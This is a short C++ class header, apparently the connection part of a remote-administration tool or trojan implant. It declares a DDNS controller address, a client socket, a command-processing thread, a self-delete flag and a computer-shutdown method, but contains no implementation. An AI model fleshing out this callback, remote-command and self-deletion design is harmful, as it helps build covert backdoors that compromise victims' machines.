#pragma once
#include "SystemUtility.h"
#include "NetProtocolThread.h"
#include "DealCMDThread.h"
class CConnect
{
private:
	CString					m_strDDNSIP;			// DDNS IP地址
	CString					m_strClientIP;			// 客户端IP地址
	UINT					m_nClientPort;			// 客户端监听端口
	BOOL					m_bDeleteSelf;

	SOCKET					m_hSocketClient;		// 与客户端建立通讯SOCKET
	CSystemUtility			m_systemUtility;
	HWND                    m_hwnd;
	void StopComputer(UINT uFlags);
public:
	CConnect();
	~CConnect(void);
	BOOL StartConnect(HWND hwnd);
	BOOL MakeClientConnectInfo();
	BOOL InitConnection();
	void StopConnect();

	void StartWork();

	CNetProtocolThread*		m_pNetProcotolThread;
	CDealCMDThread*			m_pDealCMDThread;
};

